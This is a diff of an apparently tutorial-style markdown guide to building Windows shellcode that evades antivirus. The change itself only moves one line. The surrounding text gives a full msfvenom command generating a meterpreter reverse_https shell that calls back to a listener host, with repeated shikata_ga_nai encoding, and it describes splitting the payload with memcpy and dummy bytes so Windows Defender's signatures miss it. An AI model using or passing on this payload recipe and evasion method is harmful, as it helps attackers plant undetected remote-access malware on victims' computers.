@@ -39,14 +39,13 @@ First, we can use msfvenom to generate a shellcode, this will be the basis where
 msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.10 LPORT=443 HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -e x86/shikata_ga_nai -i 8 -f c > shell.c
 ```
 ![alt text](resources/base_shellcode.png)   
+The raw shellcode can be found under ```final/shell.c```. 
 
 Just the shellcode itself will not evade any antivirus, so next we will need further obfuscate the shell code. In visual studio, create a new C project, we will mainly be using the ```memcpy``` function. The ```memcpy``` function allows flipping of bytes, replacing a specified number of bytes in the target ```char``` with a second ```char```. The syntax of ```memcpy``` is as follows:
 ```
 memcpy(<target char> + <offset>, <secondary char>, <length of secondary char>)
 ```
 ![alt text](resources/memcpy_demo.png)   
-The raw shellcode can be found under ```final/shell.c```.   
-
 
 Using the function, we can replace the geninue bytes with dummy bytes, and store the genuine bytes in another string, when the executable runs, the genuine shellcode will then be assembled. The random bytes can be generated using random.org. Windows defender will be our primary antivirus solution to evade, since it's the most common antivirus on a windows computer. Windows defender has gotten very good at recognising signature of the payloads, so more ```memcpy``` functions will have to be used to evade detection.   
 
